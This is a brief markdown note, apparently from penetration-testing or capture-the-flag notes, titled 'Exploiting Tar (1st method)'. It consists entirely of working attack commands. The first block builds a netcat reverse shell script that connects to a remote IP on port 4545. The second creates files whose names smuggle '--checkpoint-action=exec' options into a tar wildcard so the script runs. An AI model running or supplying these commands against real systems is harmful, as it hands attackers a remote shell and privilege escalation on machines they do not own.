- - -
## Exploiting Tar ( 1st method ) :

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.48.252 4545 >/tmp/f" > shell.sh ; chmod +x shell.sh
```

```sh 
touch "./--checkpoint-action=exec=sh shell.sh" ; touch "./--checkpoint=1"
```

- - -

